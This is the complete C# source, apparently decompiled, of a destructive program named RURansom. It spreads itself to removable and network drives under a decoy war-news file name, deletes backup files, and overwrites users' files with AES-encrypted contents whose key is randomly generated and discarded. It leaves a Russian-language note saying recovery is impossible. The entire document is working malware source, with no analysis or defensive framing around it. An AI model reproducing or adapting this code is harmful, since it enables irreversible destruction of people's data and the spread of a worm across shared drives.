using System;
using System.IO;
using System.Reflection;
using System.Text;

namespace RURansom
{
	// Token: 0x02000002 RID: 2
	internal class Program
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		private static void Main(string[] args)
		{
			try
			{
				DriveInfo[] drives = DriveInfo.GetDrives();
				foreach (DriveInfo driveInfo in drives)
				{
					bool flag = driveInfo.DriveType == DriveType.Removable || driveInfo.DriveType == DriveType.Network;
					if (flag)
					{
						Program.spread(driveInfo.Name.ToString());
					}
					bool flag2 = driveInfo.Name.ToString() == "C:\\";
					if (flag2)
					{
						Program.encryptAllDirectoryAndSubDirectoryFiles("C:\\Users\\" + Environment.UserName);
					}
					else
					{
						Program.encryptAllDirectoryAndSubDirectoryFiles(driveInfo.Name.ToString());
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000002 RID: 2 RVA: 0x0000210C File Offset: 0x0000030C
		private static void encryptAllDirectoryAndSubDirectoryFiles(string d)
		{
			try
			{
				bool flag = d != "C:\\Users\\" + Environment.UserName + "\\AppData";
				if (flag)
				{
					string[] files = Directory.GetFiles(d);
					for (int i = 0; i < files.Length; i++)
					{
						FileInfo fileInfo = new FileInfo(files[i]);
						bool flag2 = Path.GetExtension(files[i]).ToLower() == ".bak";
						if (flag2)
						{
							File.Delete(files[i]);
						}
						fileInfo.Attributes = FileAttributes.Normal;
						Program.EncryptFile(files[i], d);
					}
					string[] directories = Directory.GetDirectories(d);
					for (int j = 0; j < directories.Length; j++)
					{
						Program.encryptAllDirectoryAndSubDirectoryFiles(directories[j] + "\\");
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000003 RID: 3 RVA: 0x000021F8 File Offset: 0x000003F8
		private static void spread(string dp)
		{
			try
			{
				File.Copy(Assembly.GetExecutingAssembly().Location, dp + "Россия-Украина_Война-Обновление.doc.exe");
			}
			catch
			{
			}
		}

		// Token: 0x06000004 RID: 4 RVA: 0x0000223C File Offset: 0x0000043C
		private static void EncryptFile(string file, string dir)
		{
			try
			{
				string text = File.ReadAllText(file);
				bool flag = text == "";
				if (!flag)
				{
					AesCrypter aesCrypter = new AesCrypter();
					byte[] bytes = Encoding.UTF8.GetBytes(text);
					string s = Program.getEncryptedAesKey()[0];
					string text2 = Program.getEncryptedAesKey()[1];
					byte[] inArray = AesCrypter.AES_Encrypt(bytes, Encoding.UTF8.GetBytes(s));
					string contents = Convert.ToBase64String(inArray);
					File.WriteAllText(file, contents);
					Path.ChangeExtension(file, ".fs_invade");
					string text3 = Convert.ToBase64String(Encoding.UTF8.GetBytes(Program.getEncryptedAesKey()[2]));
					string[] contents2 = new string[]
					{
						"24 февраля президент Владимир Путин объявил войну Украине.",
						"Чтобы противостоять этому, я, создатель RU_Ransom, создал эту вредоносную программу для нанесения ущерба России. Вы купили это себе, господин президент.",
						"Нет никакого способа расшифровать ваши файлы. Никакой оплаты, только ущерб. И да, это \"миротворчество\", как это делает Влади Папа, убивая невинных мирных жителей",
						"И да, это было переведено с бангла на русский с помощью Google Translate..."
					};
					File.WriteAllLines(dir + "Полномасштабное_кибервторжение.txt", contents2);
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000005 RID: 5 RVA: 0x00002328 File Offset: 0x00000528
		private static string[] getEncryptedAesKey()
		{
			AesCrypter aesCrypter = new AesCrypter();
			byte[] bytes = Encoding.UTF8.GetBytes(Program.BuildPassword("FullScaleCyberInvasion + " + Environment.MachineName));
			byte[] bytes2 = Encoding.UTF8.GetBytes(Program.BuildPassword("RU_Ransom" + Environment.UserName + "2022"));
			byte[] inArray = AesCrypter.AES_Encrypt(bytes, bytes2);
			return new string[]
			{
				Convert.ToBase64String(bytes),
				Convert.ToBase64String(bytes2),
				Convert.ToBase64String(inArray)
			};
		}

		// Token: 0x06000006 RID: 6 RVA: 0x000023B4 File Offset: 0x000005B4
		private static string BuildPassword(string str)
		{
			StringBuilder stringBuilder = new StringBuilder();
			Random random = new Random();
			for (int i = 0; i < str.Length; i++)
			{
				stringBuilder.Append(str[random.Next(0, str.Length)]);
			}
			return stringBuilder.ToString();
		}
	}
}
